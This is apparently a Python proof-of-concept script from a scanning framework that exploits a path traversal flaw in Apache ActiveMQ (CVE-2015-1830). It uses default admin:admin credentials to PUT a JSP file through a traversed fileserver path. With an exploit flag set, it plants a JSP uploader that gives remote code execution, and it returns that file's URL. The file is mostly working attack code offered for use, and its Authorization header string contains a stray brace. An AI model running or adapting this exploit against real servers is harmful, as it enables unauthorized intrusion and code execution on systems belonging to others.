#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = i@cdxy.me
# project = https://github.com/Xyntax/POC-T

"""
ActiveMQ file upload exploit
[Path traversal leading to unauthenticated RCE in ActiveMQ (CVE-2015-1830)]

admin:admin
"""

import requests
import base64
from plugin.util import randomString
from plugin.static import JSP_UPLOAD

ENABLE_EXP = False


def poc(url):
    url = "http://" + url if '://' not in url else url
    name = randomString(5)
    uri = '{url}/admin/{name}.jsp'.format(url=url.rstrip('/'), name=name)
    target = r'{url}/fileserver/sex../../..\admin/{name}.jsp'.format(url=url.rstrip('/'), name=name)
    key = base64.b64encode("admin:admin")
    headers = {'Authorization': 'Basic %s}' % key, 'User-Agent': 'Mozilla/5.0 Gecko/20100101 Firefox/45.0'}
    put_data = JSP_UPLOAD if ENABLE_EXP else randomString(10)
    try:
        res1 = requests.put(target, headers=headers, data=put_data, timeout=10)
        res2 = requests.get(uri, headers=headers, timeout=10)
        if res1.status_code == 204 and res2.status_code == 200:
            if ENABLE_EXP:
                return uri
            return url if put_data in res2.content else False
    except Exception, error:
        # print error
        return False
    return False
